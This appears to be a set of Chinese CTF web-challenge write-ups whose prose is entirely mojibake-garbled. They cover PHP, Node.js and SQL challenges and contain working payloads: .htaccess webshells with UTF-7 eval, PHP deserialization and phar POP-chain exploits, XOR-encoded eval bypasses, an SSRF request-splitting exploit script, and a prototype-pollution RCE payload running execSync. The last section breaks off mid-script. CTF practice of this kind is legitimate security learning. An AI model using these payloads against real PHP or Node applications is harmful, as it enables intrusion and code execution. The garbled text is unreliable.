[XNUCA2019Qualifier]EasyPHP\nåˆ©ç”¨file_put_contentsåœ¨æ–‡ä»¶ä¸­å†™å…¥shell  \n$contentè¿‡æ»¤`on` `html` `type` `flag` `upload` `file`\n$filenameä½¿ç”¨[a-z.]\n\n>ç”±äºé¢˜ç›®æœåŠ¡å™¨ä¸­é—´ä»¶ä¸ºapacheï¼Œå› æ­¤æƒ³åˆ°äº†ä¼ .htaceessæ¥è§£æphp\n\n\né‡å†™è¦†ç›–.htaccessæ–‡ä»¶\n\n### é¢„æœŸè§£\n>include_pathç”¨æ¥è®¾ç½®include()æˆ–require()å‡½æ•°åŒ…å«æ–‡ä»¶çš„å‚è€ƒè·¯å¾„ï¼Œå½“ä½¿ç”¨include()æˆ–require()å‡½æ•°åŒ…å«æ–‡ä»¶çš„æ—¶å€™,ç¨‹åºé¦–å…ˆä»¥include_pathè®¾ç½®çš„è·¯å¾„ä½œä¸ºå‚è€ƒç‚¹å»æ‰¾æ–‡ä»¶,å¦‚æœæ‰¾ä¸åˆ°,åˆ™ä»¥ç¨‹åºè‡ªèº«æ‰€åœ¨çš„è·¯å¾„ä¸ºå‚è€ƒç‚¹å»æ‰¾æ‰€è¦çš„æ–‡ä»¶\n\nå½“æ–‡ä»¶ä¸­åŒ…å«ä¸€ä¸ªä¸å­˜åœ¨çš„fl3g.phpä¼šæŠ¥é”™\n\n>error_logå¯ä»¥æŠŠé”™è¯¯æ—¥å¿—ä¿å­˜åˆ°æŒ‡å®šçš„ç›®å½•ä¸­,log_errorsä¸º1å¼€å¯é”™è¯¯è®°å½•\n\næŠ¥é”™æ—¶ä¼šæŠŠé”™è¯¯ä¿¡æ¯ä¿å­˜è‡³æŸä¸€æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨php_valueæ¥è®¾ç½®è¿™ä¸ªæ–‡ä»¶  \n\n>.htaccessä¸­å‡ºç°æ— æ„ä¹‰å­—ç¬¦å†è®¿é—®å½“å‰ç›®å½•æ–‡ä»¶æœåŠ¡å™¨å°†500\n\nä¸Šä¼ çš„.htaccessè¦æ³¨é‡Šåè¾¹çš„`\\njust one chance`\napacheçš„è§„åˆ™æ˜¯æ³¨é‡Šè¦å¦èµ·ä¸€è¡Œ\n`\\`æœ‰æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œçš„åŠŸèƒ½  \n.htaccessåªæ”¯æŒå•è¡Œæ³¨é‡Šï¼Œå¯ä»¥åˆ©ç”¨`#\\`æ¥æ³¨é‡Šæ‰åè¾¹çš„å­—ç¬¦ä¸²  \n\n> error_logçš„å†…å®¹é»˜è®¤æ˜¯htmlentitiesçš„\n\nå¯ä»¥ä½¿ç”¨utf-7ç¼–ç ç»•è¿‡  \n\n.htaccess:\n```\nphp_value error_log /tmp/fl3g.php\nphp_value error_reporting 32767\nphp_value include_path \"+ADw?php eval($_GET[a])+ADs +AF8AXw-halt+AF8-compiler()+ADs\"\n# \\\n```\nè®¿é—®index.phpä¹‹åä¼šç•™ä¸‹é”™è¯¯è®°å½•å†å†™å…¥æ–°çš„.htaccess\n```\nphp_value include_path \"/tmp\"\nphp_value zend.multibyte 1\nphp_value zend.script_encoding \"UTF-7\"\n# \\\n```\n>zend.multibyte 1 #è¿›è¡Œç¼–ç \n>zend.script_encoding \"UTF-7\"  #æŒ‡å®šutf-7ç¼–ç \n\nå†æ¬¡è®¿é—®index.phpå‘aä¼ å…¥payload \n\n### éé¢„æœŸ\nåˆ©ç”¨`\\`æ‹¼æ¥ä¸Šä¸‹ä¸¤è¡Œæ¥ç»•è¿‡å¯¹fileçš„æ£€æµ‹\n```\nphp_value auto_prepend_fi\\\nle \".htaccess\"\n```\nauto_pretend_fileçš„ä½œç”¨ä¹Ÿæ˜¯è°ƒç”¨ç¬¬ä¸‰æ–¹æ–‡ä»¶  \nå¯ä»¥é€šè¿‡errordocument 404æ¥è‡ªå®šä¹‰404ç•Œé¢ï¼Œè¾“å‡ºpayloadå›æ˜¾  \n```\nfilename=.htaccess&content=php_value%20auto_prepend_fi\\%0Ale%20\".htaccess\"%0AErrorDocument%20404%20\"<?php%20system(\\'cat%20../../../fl[a]g\\');?>\\\\\n```\n# [MRCTF2020]Ezpop\n```\n__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘\n__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘\n__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘\n__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘\n__get() //ç”¨äºä»ä¸å¯è®¿é—®ï¼ˆæˆ–ä¸å­˜åœ¨ï¼‰çš„å±æ€§(protect private)è¯»å–æ•°æ®\n__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§\n__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘\n__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘\n__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘\n__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘\n```\nModifier():include()å¯ä»¥åŒ…å«flag.phpï¼Œéœ€è¦å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘__invoke()  \nTest():åˆ©ç”¨protected  $varè°ƒç”¨__get()è¿”å›ä¸€ä¸ªå‡½æ•°  \nShow():echoä¸€ä¸ªç±»è§¦å‘__toString  \næˆ‘ä»¬çš„ç›®çš„æ˜¯å¾—åˆ°include(flag.php)å¹¶é€šè¿‡__toStringæ‰“å°å‡ºæ¥  \n\n\nç»™\\$this->sourceä¼ å…¥new show(),è§¦å‘__toString(),æ­¤æ—¶å› ä¸ºTest()é‡Œæ²¡æœ‰\\$sourceå¯ä»¥è®¿é—®æ‰€ä»¥ä¼šè§¦å‘__get()  \nè®©\\$p=new Modifier()è§¦å‘__invoke()\n\nexp:\n```php\n<?php\nclass Modifier {\n  protected  $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";\n\n}\n\n\nclass Test{\n    public $p;\n}\n\nclass Show{\n    public $source;\n    public $str;\n}\n\n\n$a = new Show();\n$a->source = new Show();\n$a->source->str=new Test();\n$a->source->str->p = new Modifier();\n\necho urlencode(serialize($a));\n\n?>\n```\n\n# [ISITDTU 2019]EasyPHP\nè¿™é¢˜å’‹è¿™ä¹ˆçœ¼ç†Ÿ....  \nç»™äº†æºç \n```php\n<?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET['_'];\nif ( preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', $_) )\n    die('rosÃ© will not do it');\n\nif ( strlen(count_chars(strtolower($_), 0x3)) > 0xd )\n    die('you are so close, omg');\n\neval($_);\n?>\n```\n```php\n<?php\n\nfor ($ascii = 0; $ascii < 256; $ascii++) {\n    \n    if (!preg_match('/[\\x00- 0-9\\'\"`$&.,|[{_defgops\\x7F]+/i', chr($ascii))) {\n        echo chr($ascii);\n    }\n}\n?>\n```\næ‰“å°æ²¡è¿‡æ»¤çš„å­—ç¬¦ \n```\n! # % ( ) * + - / : ; < = > ? @ A B C H I J K L M N Q R T U V W X Y Z \\ ] ^ a b c h i j k l m n q r t u v w x y z } ~ \n```\n[PHPä¸ä½¿ç”¨æ•°å­—,å­—æ¯å’Œä¸‹åˆ’çº¿å†™shell](https://www.smi1e.top/php%E4%B8%8D%E4%BD%BF%E7%94%A8%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E5%92%8C%E4%B8%8B%E5%88%92%E7%BA%BF%E5%86%99shell/)\n>count_chars â€” è¿”å›å­—ç¬¦ä¸²æ‰€ç”¨å­—ç¬¦çš„ä¿¡æ¯\n\nç¬¬äºŒä¸ªifè¯­å¥çš„æ„æ€æ˜¯$\\_çš„ä¸é‡å¤çš„å­—ç¬¦é•¿åº¦è¦<=13  \nå–åæ„é€ phpinfo();è¿›è¡Œæµ‹è¯•\n```\necho urlencode(~\"phpinfo\");\n```\n`?_=(~%8F%97%8F%96%91%99%90)();`\næœ‰å›æ˜¾\næ¥ä¸‹æ¥æ„é€ payloadæ¢æµ‹ç›®å½•æ‰¾flag  \nç›®çš„æ˜¯`?_=print_r(scandir(.))`\n```\n.->%D1\nscandir-> %8C%9C%9E%91%9B%96%8D\nprint_r-> %8F%8D%96%91%8B%A0%8D\n```\né•¿åº¦è¶…å‡ºé™åˆ¶  \né€šè¿‡å¼‚æˆ–å‡å°‘ä¸åŒçš„å­—ç¬¦ï¼Œæˆ‘ä»¬éœ€è¦ä¿ç•™çš„æ˜¯`();~%ff`è¿˜å¯ä»¥ç•™æœ‰8ä¸ªä¸åŒçš„å­—ç¬¦\n\n```py\ntable = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c]  # Original \n#count_char(\"scandirprint_r.\",0x3)==11\n#[t,d,_,c,p,n,a,.,i,r,s]\nresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 0xd1, 0x96, 0x8c] #when len(temp)==11  \ntemp = []\nfor d in table:\n    for a in result:\n        for b in result:\n            for c in result:\n                if (a ^ b ^ c == d):\n                    if a == b == c == d:\n                        continue\n                    else:\n                        print(\"a=0x%x,b=0x%x,c=0x%x,d=0x%x\" % (a, b, c, d))\n                        if d not in temp:\n                            temp.append(d)\nprint(len(temp), temp)\n```\n\næ•´ç†ä¹‹åæœ‰\n```\n?_=((%9b%9c%9b%9b%9b%9b%9c)^(%9b%9e%9b%9c%9c%9b%8f)^(%8f%8f%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));\n```\nå›æ˜¾\n>Array ( [0] => . [1] => .. [2] => index.php [3] => n0t_a_flAg_FiLe_dONT_rE4D_7hIs.txt )\n\næ‰€ä»¥æœ‰ `readfile(end(scandir(.)))` `show_source(end(scandir(.)))`\næ”¹ä¸€ä¸‹è„šæœ¬çš„tableå’Œresult\n```py\ntable=[0xa0, 0x88, 0x8a, 0x8c, 0x8d,0x90,0x91,0xd1,0x96,0x97,0x9a,0x9b,0x9c,0x9e]\nresult=[0xa0, 0x88,0x8d,0xd1,0x97,0x9a,0x9b,0x9c]\n```\næœ‰\n```\n?_=((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));\n```\n\n# [GYCTF2020]Node Game\nnode.js express\n```js\napp.get('/', function(req, res) {\n    var action = req.query.action?req.query.action:\"index\";\n    if( action.includes(\"/\") || action.includes(\"\\\\\") ){\n        res.send(\"Errrrr, You have been Blocked\");\n    }\n    file = path.join(__dirname + '/template/'+ action +'.pug');\n    var html = pug.renderFile(file); //æ¸²æŸ“pugæ–‡ä»¶\n    res.send(html);\n});\n```\nä¸Šä¼ pugæ–‡ä»¶ï¼Œåœ¨/template/ä¸‹\n```js\napp.post('/file_upload', function(req, res){\n    var ip = req.connection.remoteAddress;\n    var obj = {\n        msg: '',\n    }\n    if (!ip.includes('127.0.0.1')) {\n        obj.msg=\"only admin's ip can use it\"\n        res.send(JSON.stringify(obj));\n        return \n    }\n    fs.readFile(req.files[0].path, function(err, data){\n        if(err){\n            obj.msg = 'upload failed';\n            res.send(JSON.stringify(obj));\n        }else{\n            var file_path = '/uploads/' + req.files[0].mimetype +\"/\";\n            var file_name = req.files[0].originalname\n            var dir_file = __dirname + file_path + file_name\n            if(!fs.existsSync(__dirname + file_path)){\n                try {\n                    fs.mkdirSync(__dirname + file_path)\n                } catch (error) {\n                    obj.msg = \"file type error\";\n                    res.send(JSON.stringify(obj));\n                    return\n                }\n            }\n            try {\n                fs.writeFileSync(dir_file,data)\n                obj = {\n                    msg: 'upload success',\n                    filename: file_path + file_name\n                } \n            } catch (error) {\n                obj.msg = 'upload failed';\n            }\n            res.send(JSON.stringify(obj));    \n        }\n    })\n})\n\n```\nuploadè·¯ç”±åˆ¤æ–­ipæ˜¯å¦ä¸º127.0.0.1  \næ ¹æ®mimetypeæ‹¼æ¥è·¯å¾„ï¼Œå¯æ§  \nå¯ä»¥é€šè¿‡`/uploads/../template/`ä¸Šä¼ æ–‡ä»¶åˆ°/template/  \npugæ–‡ä»¶åŒ…å«flagæ–‡ä»¶[pug-åŒ…å«include](https://pugjs.org/zh-cn/language/includes.html))  \n>å¯¹äºç›´æ¥ä½¿ç”¨çš„ Web åº”ç”¨ï¼Œå¿…é¡»ä½¿ç”¨ä»TCPè¿æ¥ä¸­å¾—åˆ°çš„ Remote Addressï¼Œæ‰æ˜¯ç”¨æˆ·çœŸå®çš„IP\n\nç”¨äº†remoteaddress ,ipä¸èƒ½ä¼ªé€ ï¼Œè€ƒè™‘ssrf  \n[SSRF](https://websec.readthedocs.io/zh/latest/vuln/ssrf.html)\n\ncoreè·¯ç”±:\n```js\napp.get('/core', function(req, res) {\n    var q = req.query.q;\n    var resp = \"\";\n    if (q) {\n        var url = 'http://localhost:8081/source?' + q\n        //è®¿é—®æœ¬åœ°,qå¯æ§\n        console.log(url)\n        var trigger = blacklist(url);\n        if (trigger === true) {\n            res.send(\"\");\n               } else {\n            try {\n                http.get(url, function(resp) {\n                    resp.setEncoding('utf8');\n                    resp.on('error', function(err) {\n                    if (err.code === \"ECONNRESET\") {\n                     console.log(\"Timeout occurs\");\n                     return;\n                    }\n                   });\n\n                    resp.on('data', function(chunk) {\n                        try {\n                         resps = chunk.toString();\n                         res.send(resps);\n                        }catch (e) {\n                           res.send(e.message);\n                        }\n \n                    }).on('error', (e) => {\n                         res.send(e.message);});\n                });\n            } catch (error) {\n                console.log(error);\n            }\n        }\n    } else {\n        res.send(\"search param 'q' missing!\");\n    }\n})\n```\nåˆ©ç”¨qæ¥è®¿é—®åªå…è®¸æœ¬åœ°è®¿é—®çš„file_uploadè·¯ç”±  \n\nåœ¨file_uploadé‡Œä¸Šä¼ .pugæ–‡ä»¶ï¼Œä¿®æ”¹content-typeï¼Œåˆ©ç”¨actionæ¸²æŸ“pugæ–‡ä»¶  \n[é€šè¿‡æ‹†åˆ†æ”»å‡»å®ç°çš„SSRFæ”»å‡»](https://xz.aliyun.com/t/2894)\n>ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦, åªä¿ç•™ä½ä½çš„å­—ç¬¦ã€‚\n\n\n[Nullcon HackIM 2020 - split second](https://blog.rwx.kr/nullcon-hackim-2020-split-second/)\n\n>node.jså‘½ä»¤æ‰§è¡Œpayload`global.process.mainModule.require('child_process').exec('ls')`  \n\næŠ“ä¸ª.pugä¸Šä¼ çš„åŒ…æ¥æ„é€ æ•°æ®  \n\nexp from [guoke](https://guokeya.github.io/post/hz6_KR03h/)\n```py\nimport urllib.parse\nimport requests\n\npayload = ''' HTTP/1.1\n\nPOST /file_upload HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------919695033422425209299810\nContent-Length: 291\n\n----------------------------919695033422425209299810\nContent-Disposition: form-data; name=\"file\"; filename=\"abc.pug\"\nContent-Type: ../template\n\ndoctype html\nhtml\n  head\n    style\n      include ../../../../../../../flag.txt\n\n----------------------------919695033422425209299810--\n\nGET /flag HTTP/1.1\nx:'''\npayload = payload.replace(\"\\n\", \"\\r\\n\")\npayload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)\nr = requests.get('http://http://11677f6e-fb23-401a-b5da-eb66185d1871.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))\n#urlç¼–ç \nprint(r.text)\n```\n>æœ€åçš„GET /flagåªæ˜¯ä¸ºäº†é—­åˆHTTPè¯·æ±‚\n\nè®¿é—®/?action=abc\n\n[å‡ºé¢˜äººwp](https://blog.5am3.com/2020/02/11/ctf-node1/#nullcon-HackIM-2020-split-second)\nå‡ºé¢˜äººç»™çš„expæ˜¯é€šè¿‡å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼æ¥å®ç°çš„ï¼Œåœ¨pugé‡Œå¯ä»¥é€šè¿‡ `#{payload}` `- payload`  æ¥æ‰§è¡Œpugæ–‡ä»¶é‡Œçš„å‘½ä»¤\n\n# [GYCTF2020]Ez_Express\næ³¨å†Œå®Œä¹‹åçœ‹æºç æœ‰æ³¨é‡Šå¯ä»¥ä¸‹è½½www.zip![](https://md.vidar.club/uploads/upload_0e3cd44933fa2cfff69f15365340127c.png)\nåŸå‹é“¾æ±¡æŸ“ rce\nclone()åœ¨/actioné‡Œ\n[Node.js åŸå‹æ±¡æŸ“æ”»å‡»çš„åˆ†æä¸åˆ©ç”¨](https://xz.aliyun.com/t/4229#toc-6)\n[JavaScriptåŸå‹é“¾æ±¡æŸ“åˆæ¢](https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#%E5%8E%9F%E5%9E%8B)\nclone()åœ¨/actioné‡Œ\n\n>è¯¥é¡¹ç›®ä½¿ç”¨äº†ejsä½œä¸ºæ¨¡æ¿å¼•æ“ï¼Œè¯¥æ¨¡æ¿å¼•æ“ä¸­é€šå¸¸ç”±evalç­‰æ“ä½œç”¨äºè§£æ\n>expressæ¡†æ¶ï¼Œæ”¯æŒJsonç›´æ¥ä¼ è¾“æ•°æ®ï¼Œå¹¶ä¸”æ¥æ”¶çš„å‚æ•°ä¸ºreq.body\n>toUpperCase():å­—ç¬¦\"Ä±\"ã€\"Å¿\" ç»è¿‡toUpperCaseå¤„ç†åç»“æœä¸º \"I\"ã€\"S\"\n\næºç æ³¨å†Œé™åˆ¶äº†`ADMIN`\nè®©ç”¨æˆ·åä¸º`ADMÄ±N`å°±å¯ä»¥ç»•è¿‡é™åˆ¶æ³¨å†Œä¸€ä¸ªadminè´¦æˆ·  \n\næç¤ºäº†è¿™ä¸ª\n`Hello,ADMIN ,flag in /flag`\næ¥ä¸‹æ¥åº”è¯¥å°±æ˜¯rce  \nå…ˆæ‰¾ä¸€ä¸‹åˆ©ç”¨ç‚¹  \n```js\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n```\nå‘ç°æºç é‡Œçš„outputFunctionNameä¸ºundefinedï¼Œé‚£åº”è¯¥å°±æ˜¯è¿™äº†  \ncontent-typeéœ€è¦æ”¹ä¸ºjson  \n\npayload:\n```\n{\"lua\":\"aaa\",\"__proto__\":{\"outputFunctionName\":\"a=1;return global.process.mainModule.require('child_process').execSync('cat /flag'); //\"}}\n```\n# [SWPUCTF 2018]SimplePHP\næ‰“å¼€æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç•Œé¢  \næºç ä¸­æœ‰æç¤º\n```\n<!--flag is in f1ag.php-->\n```\næ‰€ä»¥æ˜¯è¦æƒ³åŠæ³•è¯»å–f1ag.phpçš„å†…å®¹  \nå…ˆæ‰¾æ‰¾æºç   \nä¸Šä¼ æ–‡ä»¶æˆåŠŸä¹‹ååœ¨æŸ¥çœ‹æ–‡ä»¶é‡Œæ‰¾ä¸åˆ°ä¼ è¿‡çš„æ–‡ä»¶ï¼Œçœ‹çœ‹urlå‘ç°\n`/file.php?file=`\næ„Ÿè§‰æ˜¯è®©æˆ‘ä»¬å¾€åé¢åŠ ä¸œè¥¿ï¼Œè¯•ç€åŠ äº†index.phpå›æ˜¾äº†æºç   \nclass.php:\n```php\n<?php\nclass C1e4r\n{\n    public $test;\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n    public function __destruct()\n    {\n        $this->test = $this->str;\n        echo $this->test;\n    }\n}\n\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;   //$this->source = phar://phar.jpg\n        echo $this->source;\n    }\n    public function __toString()\n    {\n        $content = $this->str['str']->source;\n        return $content;\n    }\n    public function __set($key,$value)\n    {\n        $this->$key = $value;\n    }\n    public function _show()\n    {\n        if(preg_match('/http|https|file:|gopher|dict|\\.\\.|f1ag/i',$this->source)) {\n            die('hacker!');\n        } else {\n            highlight_file($this->source);\n        }\n        \n    }\n    public function __wakeup()\n    {\n        if(preg_match(\"/http|https|file:|gopher|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker~\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $file;\n    public $params;\n    public function __construct()\n    {\n        $this->params = array();\n    }\n    public function __get($key)\n    {\n        return $this->get($key);\n    }\n    public function get($key)\n    {\n        if(isset($this->params[$key])) {\n            $value = $this->params[$key];\n        } else {\n            $value = \"index.php\";\n        }\n        return $this->file_get($value);\n    }\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n}\n?>\n```\npcharååºåˆ—åŒ–  \n[åˆ©ç”¨ phar æ‹“å±• php ååºåˆ—åŒ–æ¼æ´æ”»å‡»é¢](https://paper.seebug.org/680/)\n\npopé“¾æ˜¯C14rä¸­çš„echoè§¦å‘__toString,è§¦å‘__get()  \nåªåšäº†åç¼€åçš„æ£€æµ‹  \nä¿®æ”¹åç¼€åç»•è¿‡$allowed_types  \n>pharæ–‡ä»¶çš„æ‰©å±•åæ˜¯ç‹¬ç«‹çš„ï¼Œå¦‚æœevil.phprè¢«é‡å‘½åä¸ºäº†evil.jpgï¼Œä¸Šé¢çš„è§¦å‘pharååºåˆ—åŒ–çš„ç¤ºä¾‹ä»ç„¶æœ‰æ•ˆ  \n\n\nä¸Šä¼ åˆ°æœåŠ¡å™¨ååˆ©ç”¨file_exitstsä½¿ç”¨phar://æ‰§è¡Œä»£ç   \nåˆ©ç”¨ç‚¹æ˜¯\n```php\n    public function file_get($value)\n    {\n        $text = base64_encode(file_get_contents($value));\n        return $text;\n    }\n```\nphar.phar:\n```php\n<?php\nclass C1e4r\n{\n    public $str;\n    public function __construct($name)\n    {\n        $this->str = $name;\n    }\n}\n\nclass Show\n{\n    public $str;\n    public function __construct($file)\n    {\n        $this->str=array(); #åˆ›å»ºæ•°ç»„ï¼Œåé¢éœ€è¦åˆ©ç”¨str['str']\n    }\n}\n\nclass Test\n{\n    public $params;\n    public function __construct()\n    {\n        $this->params = array(); #éœ€è¦åˆ©ç”¨params['source']=flagæ–‡ä»¶è·¯å¾„\n    \n}\n\n$b=new Test();\n$b->params=array('source'=>/var/www/html/f1ag.php);\n$a=new Show();\n$a->str=array('str'=>$b);#è§¦å‘testçš„__get()\n$c=new C1e4r($a);\n\n\n$phar = new Phar('phar.phar');\n$phar -> stopBuffering();\n$phar -> setStub('<?php __HALT_COMPILER();?>');\n$phar -> addFromString('test.txt','test');\n$phar -> setMetadata($object);\n$phar -> stopBuffering();\n```  \nä¸Šä¼ ,æˆªåŒ…æ”¹åç¼€å    \næ ¹æ®`$filename = md5($_FILES[\"file\"][\"name\"].$_SERVER[\"REMOTE_ADDR\"]).\".jpg\"`\nå¾—åˆ°ä¸Šä¼ çš„åœ°å€  \n\nè®¿é—®`file.php?file=phar://upload/66a453d5efb51fb0aaafc7840b7e5915.jpg`\n~~æ€ä¹ˆåˆfile dosen't existäº†å•Š./upload/ç›®å½•ä¸‹æ˜æ˜å°±æœ‰å•Šï¼Œæ‹¿äº†åˆ«äººçš„pocè¯•ä¹Ÿæ˜¯ä¸è¡Œ....~~\n\n# [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb\n\nfuncå‚æ•°è¾“å…¥æµ‹è¯•å›æ˜¾å‡ºäº†è¿™é‡Œç”¨çš„å‡½æ•°æ˜¯call_user_func()\nç»™äº†index.phpçš„è·¯å¾„ï¼Œè¯»ä¸€ä¸‹\n```php\nfunc=readfile&p=/var/www/html/index.php\n```\nå›æ˜¾å¦‚ä¸‹\n```php\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\nçœ‹åˆ°ç±»è”æƒ³åˆ°ååºåˆ—åŒ–(è¿™é‡Œå¡äº†è›®ä¹…çš„...ä¸å¤ªåº”è¯¥...)  \nå¯ä»¥åˆ©ç”¨unserializeå‡½æ•°  \npayload:\n```php\n<?php\n\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n    }\n\n$a=new Test();\n$a->p=\"ls /tmp/flagoefiu4r93\";\n$a->func=\"system\";\necho serialize($a);\n    ?>\n```\nè·¯å¾„æ˜¯çŒœçš„ï¼Œ=ã€‚=ï¼Œæ„Ÿè§‰è¦ä¹ˆæ”¾åœ¨sysï¼Œè¦ä¹ˆæ”¾åœ¨tmpï¼Œè¦ä¹ˆæ”¾åœ¨å…¶ä»–çš„ä»€ä¹ˆåœ°æ–¹å°±è¯•äº†ä¸‹\nlinuxå‘½ä»¤å¯ä»¥ç”¨`find / -name *flag*`\n\n# [Black Watch å…¥ç¾¤é¢˜]Web \n![](04.png)\nçƒ­ç‚¹è·³è½¬æˆªåŒ…å¾—\n```\nGET /backend/content_detail.php?id=1 HTTP/1.1\n```\nå¯èƒ½åœ¨idå¤„å­˜åœ¨æ³¨å…¥  \n[SQLæ³¨å…¥ByPassçš„ä¸€äº›å°æŠ€å·§](https://www.secpulse.com/archives/68991.html)  \næµ‹è¯•:\n```\n1^1^0ï¼Œ1^0^0\n```\nå½“id=0æ—¶è¿”å›[]ï¼Œè€Œidä¸º1æ—¶è¿”å›æ•°æ®  \nåˆ©ç”¨è¿™ä¸ªç‰¹æ€§è¿›è¡Œå¼‚æˆ–æ³¨å…¥  \n\nåˆ©ç”¨`id=1^(length('show')=4)`æ£€æµ‹æ˜¯å¦è¿‡æ»¤æŸäº›å­—ç¬¦\nè¿‡æ»¤`union`  `/**/` `--+` ç©ºæ ¼ `;` `and` `\"` `{}` `limit`\n\n \n>ä½¿ç”¨æ³¨é‡Šç»•è¿‡ï¼Œ/\\*\\*/\n>ä½¿ç”¨æ‹¬å·ç»•è¿‡ï¼Œæ‹¬å·å¯ä»¥ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢ï¼Œä»»ä½•è®¡ç®—ç»“æœçš„è¯­å¥éƒ½å¯ä»¥ä½¿ç”¨ï¼ˆï¼‰åŒ…å›´ï¼Œå¹¶ä¸”ä¸¤ç«¯å¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼\n>ä½¿ç”¨ç¬¦å·æ›¿ä»£ç©ºæ ¼ %20 %09 %0d %0b %0c %0d %a0 %0a\n\n>ord()ï¼šord() å‡½æ•°æ˜¯chr() å‡½æ•°ï¼ˆå¯¹äº8 ä½çš„ASCII å­—ç¬¦ä¸²ï¼‰çš„é…å¯¹å‡½æ•°ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆUnicode å­—ç¬¦ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ASCII æ•°å€¼ï¼Œæˆ–è€…Unicode æ•°å€¼  \n>string substr(string, start, length)\n> LIMIT 0,1,ä»0å¼€å§‹å–1æ¡\n\n\næˆ‘çš„è¡¨åçˆ†ç ´å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä¸è®ºè¾“ä»€ä¹ˆéƒ½å›æ˜¾`[]`\nä½†æ˜¯åŒæ ·çš„payloadçˆ†åˆ—åå´æ²¡ä»€ä¹ˆé—®é¢˜...\n```python\nimport requests\nimport time\nimport urllib \n\nurll= 